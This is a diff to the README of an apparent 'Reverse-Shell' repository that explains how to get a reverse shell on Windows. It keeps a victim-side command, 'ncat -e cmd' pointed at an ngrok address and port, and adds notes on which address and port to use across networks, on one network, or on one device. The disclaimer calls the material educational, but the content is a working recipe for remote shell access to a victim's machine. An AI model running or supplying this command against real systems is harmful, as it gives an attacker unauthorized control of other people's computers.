@@ -1,7 +1,7 @@
 # Reverse-Shell
 This is a guide on how to perform a reverse shell on Windows.
 
-> ⚠ This repository is ONLY for educational purpose
+> This repository is ONLY for educational purpose
 
 ❓ **How Reverse Shell Works**
 - In a typical remote system access scenario, the user is the client and the target machine is the server. The user initiates a remote shell connection and the target      system listens for such connections. With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the user, and the user’s    computer listens for incoming connections on a specified port.
@@ -23,3 +23,14 @@ This is a guide on how to perform a reverse shell on Windows.
  
  🎯 **Victim's Computer**
  1. ncat -e cmd \<ngrok IP> \<ngrok PORT>
+ 
+ > ⚠ ATTENTION ⚠
+ 
+ DIFFERENT NETWORK
+- ngrok
+
+SAME NETWOTK - DIFFERENT DEVICES
+- IPv4 + 9999
+
+SAME DEVICE
+- 127.0.0.1 + 9999
